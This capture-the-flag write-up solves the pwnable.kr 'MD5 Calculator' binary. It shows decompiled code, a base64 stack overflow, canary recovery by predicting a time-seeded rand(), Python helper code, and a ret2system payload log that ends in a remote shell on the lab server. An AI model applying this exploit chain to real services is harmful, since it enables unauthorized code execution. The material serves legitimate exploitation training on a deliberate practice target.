# MD5 Calculator (canary, buffer-overflow)

## Enumeration
The reverse engineering part was quite simple. Let's start with main: 

```c
int main(void) {
  uint seed;
  int user_captcha;
  int captcha;
  
  setvbuf(stdout,(char *)0x0,1,0);
  setvbuf(stdin,(char *)0x0,1,0);
  puts("- Welcome to the free MD5 calculating service -");
  seed = time((time_t *)0x0);
  srand(seed);
  captcha = my_hash();
  printf("Are you human? input captcha : %d\n",captcha);
  scanf(&%d,&user_captcha);
  if (captcha != user_captcha) {
    puts("wrong captcha!");
    exit(0);
  }
  puts("Welcome! you are authenticated.");
  puts("Encode your data with BASE64 then paste me!");
  process_hash();
  puts("Thank you for using our service.");
  system("echo `date` >> log");
  return 0;
}
```

So the program first generates captcha, displays it and asks user to provide it back (I love the irony here as perhaps there is no better example of code which can be automated with a bot):

```console
$ ./hash 
- Welcome to the free MD5 calculating service -
Are you human? input captcha : 852554340
1234
wrong captcha!

$ ./hash 
- Welcome to the free MD5 calculating service -
Are you human? input captcha : -1852987257
-1852987257
Welcome! you are authenticated.
Encode your data with BASE64 then paste me!
TEFMQQ==
MD5(data) : 5fc00b76a67e8d89086b79a05e89fdab
Thank you for using our service.
```

and if user response with correct captcha, then it asks her/him for base64 encoded payload which is then md5 encoded and the hash is returned to user. I've checked the `process_hash` function to confirm my assumptions:

```c
// simplified

char g_buf[0x400];

void process_hash(void) {
  char* hash;
  size_t decoded_len;
  char buf[0x200];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);

  memset(buf, 0x0, 0x200);
  memset(g_buf, 0x0, 0x400);

  fgets(g_buf,0x400,stdin); # read base64 encoded string from user

  decoded_len = Base64Decode(g_buf,buf); # decode it and place result in buf
  hash = (char*) calc_md5(buf,decoded_len); # calculate md5 sum of decoded string
  printf("MD5(data) : %s\n",hash);
  free(hash);

  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail();
  }
}
```

So as I thought, the process_hash function asks user for base64 encoded string, decodes it and calculates md5 sum of it, finaly displaying the sum to user.
There is also an obvious buffer overflow vulnerability, as the user input is placed in g_buf (of size up to 0x400) and then decoding result is put into local variable buf of size 0x200. Base64 encoded string is 4/3 of orginal len, so to avoid buffer overflow the size of buf should be 0x300.

## Exploit
Well, so I had a nice buffer overflow. I could confirm that by passing long base64 encoded string:

```console
$ ./hash 
- Welcome to the free MD5 calculating service -
Are you human? input captcha : 549414485
549414485
Welcome! you are authenticated.
Encode your data with BASE64 then paste me!
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
MD5(data) : 582d7ea8bf4ee3bcc6a8608c32ddc50b
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

### Canary
The problem was, there is a canary protecting the buffer overflow. I had one function which I havn't at yet at it seemed irrelevant. The function I'm talking about is `my_ hash` responsible for creating captcha:

```c
int my_hash(void) {
  int canary;
  int rand_val;
  int in_GS_OFFSET;
  int i;
  int rvs [8];
  
  canary = *(int *)(in_GS_OFFSET + 0x14);

  i = 0;
  while (i < 8) {
    rand_val = rand();
    rvs[i] = rand_val;
    i = i + 1;
  }

  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail();
  }

  return rvs[5] + rvs[1] + (rvs[2] - rvs[3]) + canary + rvs[7] + (rvs[4] - rvs[6]);
}
```

Ha, amazing! This was exactly what I needed. It uses some pseudorandom values with canary to create captcha. The important note is that canary is one for whole program, not per function! So if I could know these 8 random values I would be able retrieve canary from captcha using undermentioned equation:

```python
import numpy as np

canary = np.uint32(captcha - rvs[5] - rvs[1] - (rvs[2] - rvs[3]) - (rvs[4] - rvs[6]) - rvs[7])
```

### Defeating randomness
The questions was, how can I get random values? They were created using random function and shouldn't be random? Well the vulnerability lies in using time(0) as seed. As we connect to server we do know the current time and so we know the seed!

For 64bit share library we would use LoadLibrary function as:

```python
from ctypes import *

lib = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
lib.srand(lib.time(0))
rvs = []
for i in range(8):
    rvs.append(lib.rand())
print(rvs)
```

But as our python interpreter works in 64 bit, then we cannot load 32 bit shared library. I've used [msl-loadlib](https://github.com/MSLNZ/msl-loadlib) to bypass this restriction:

```python
# exp.py
from msl.loadlib import Client64

class LibcClient(Client64):
    def __init__(self):
        # Specify the name of the Python module to execute on the 32-bit server (i.e., 'my_server')
        super(LibcClient, self).__init__(module32='libc_server')

    def get_rand_values(self, n):
        return self.request32('get_rand_values', n)

def get_canary():
    # Extract captcha
    captcha = np.int32(int(search(r'-?\d+', p.recvline().decode())[0], 10))

    libc_client = LibcClient()
    rvs = libc_client.get_rand_values(8)
    
    canary = np.uint32(captcha - rvs[5] - rvs[1] - (rvs[2] - rvs[3]) - (rvs[4] - rvs[6]) - rvs[7])
    log.info(f'[i] Reverted canary: {hex(canary)}')

    p.sendline(i2b(captcha)) # now we can send captcha back
    return canary
```

```python
# libc_server.py
from msl.loadlib import Server32

class LibcServer(Server32):
    """A wrapper around a 32-bit C library, 'libc.so', that has an 'rand' and 'srand' functions."""
    def __init__(self, host, port, quiet, **kwargs):
         # Load the 'cpp_lib32' shared-library file using ctypes.CDLL.
        super(LibcServer, self).__init__('/lib/i386-linux-gnu/libc.so.6', 'cdll', host, port, quiet)

    def get_rand_values(self, n):
        self.lib.srand(self.lib.time(0))
        rvs = []
        for i in range(n):
            rvs.append(self.lib.rand())
        return rvs
```

And that's it, I had a canary. The rest was obvious. I've overwrote a return address with system@plt (as there is a call from our binary later on) and as an argument I've passed a pointer to "/bin/sh" string which I've placed at the end of g_buf.
Both operations were possible as binary hasn't been compiled as PIE:

```console
$ checksec hash
[*] '/home/k/kr/md5calc/hash'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### PoC
```console
$ python3 exp.py remote
[+] Opening connection to pwnable.kr on port 9002: Done
[*] '/home/k/kr/md5calc/hash'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[DEBUG] Received 0x30 bytes:
    b'- Welcome to the free MD5 calculating service -\n'
[DEBUG] Received 0x2b bytes:
    b'Are you human? input captcha : -1477652603\n'
[*] [i] Reverted canary: 0xf0d37f00
[DEBUG] Sent 0xc bytes:
    b'-1477652603\n'
[DEBUG] Sent 0x2d9 bytes:
    00000000  51 55 46 42  51 55 46 42  51 55 46 42  51 55 46 42  │QUFB│QUFB│QUFB│QUFB│
    *
    000002a0  51 55 46 42  51 55 46 42  51 55 45 41  66 39 50 77  │QUFB│QUFB│QUEA│f9Pw│
    000002b0  51 55 46 42  51 55 46 42  51 55 46 42  51 55 46 42  │QUFB│QUFB│QUFB│QUFB│
    000002c0  67 49 67 45  43 45 46 42  51 55 47 77  73 77 51 49  │gIgE│CEFB│QUGw│swQI│
    000002d0  2f 62 69 6e  2f 73 68 00  0a                        │/bin│/sh·│·│
    000002d9
[*] Switching to interactive mode
[DEBUG] Received 0x20 bytes:
    b'Welcome! you are authenticated.\n'
Welcome! you are authenticated.
[DEBUG] Received 0x59 bytes:
    b'Encode your data with BASE64 then paste me!\n'
    b'MD5(data) : 117daeeab9c6b520879e52f2e34c9d22\n'
Encode your data with BASE64 then paste me!
MD5(data) : 117daeeab9c6b520879e52f2e34c9d22
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x4b bytes:
    b'uid=1036(md5calculator) gid=1036(md5calculator) groups=1036(md5calculator)\n'
uid=1036(md5calculator) gid=1036(md5calculator) groups=1036(md5calculator)
$  
```

[Full exploit](exp.py)